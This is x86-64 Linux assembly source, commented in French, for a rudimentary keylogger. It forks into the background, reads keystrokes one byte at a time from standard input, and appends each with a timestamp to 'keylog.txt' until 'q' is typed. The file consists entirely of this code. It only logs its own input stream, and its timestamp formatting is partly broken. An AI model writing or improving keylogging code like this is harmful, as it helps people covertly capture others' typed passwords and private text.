section .data
    filename db "keylog.txt", 0
    fd dq 0                    ; stockage du fd
    time_buf db 64 dup(0)     ; buffer pour le timestamp
    newline db 0xa            ; retour ligne
    sep db " | ", 0           ; separateur
    daemon_pid dq 0           ; pid du processus enfant

section .bss
    buffer resb 1              ; buffer pour la touche
    timespec resq 2            ; struct timespec pour time

section .text
global _start

_start:
    ; fork pour daemonize
    mov rax, 57               ; sys_fork
    syscall
    
    cmp rax, 0
    je child                  ; processus enfant
    mov [daemon_pid], rax     ; sauvegarde pid enfant
    jmp parent               

child:
    ; ouverture fichier
    mov rax, 2                ; open
    mov rdi, filename
    mov rsi, 102o            ; append + create + write
    mov rdx, 0644o           ; perms
    syscall
    
    mov [fd], rax            ; save fd

read_loop:
    ; recup timestamp
    mov rax, 228             ; clock_gettime
    mov rdi, 0               ; CLOCK_REALTIME
    mov rsi, timespec
    syscall

    ; recup stdin
    mov rax, 0                
    mov rdi, 0                
    mov rsi, buffer
    mov rdx, 1                
    syscall

    ; check si 'q' pour quitter
    cmp byte [buffer], 'q'
    je exit

    ; timestamp
    mov rax, [timespec]
    mov rdi, time_buf
    call format_time

    ; ecrit timestamp
    mov rax, 1                
    mov rdi, [fd]
    mov rsi, time_buf
    mov rdx, 20              
    syscall

    ; ecrit sep
    mov rax, 1
    mov rdi, [fd]
    mov rsi, sep
    mov rdx, 3
    syscall

    ; ecrit la touche
    mov rax, 1                
    mov rdi, [fd]
    mov rsi, buffer
    mov rdx, 1
    syscall

    ; ecrit newline
    mov rax, 1
    mov rdi, [fd]
    mov rsi, newline
    mov rdx, 1
    syscall

    jmp read_loop

parent:
    ; parent sort direct
    mov rax, 60              
    xor rdi, rdi
    syscall

exit:
    ; ferme fichier
    mov rax, 3                
    mov rdi, [fd]
    syscall

    mov rax, 60               
    xor rdi, rdi
    syscall

; convertit timestamp en string
format_time:
    ; rax = timestamp
    ; rdi = buffer destination
    push rbx
    push rcx
    
    mov rbx, 10              ; diviseur
    add rdi, 19              ; position fin buffer
    mov byte [rdi], 0        ; termine string
    
    mov rcx, 19             ; longueur max
.loop:
    dec rdi
    xor rdx, rdx
    div rbx
    add dl, '0'
    mov [rdi], dl
    dec rcx
    test rax, rax
    jnz .loop
    
    pop rcx
    pop rbx
    ret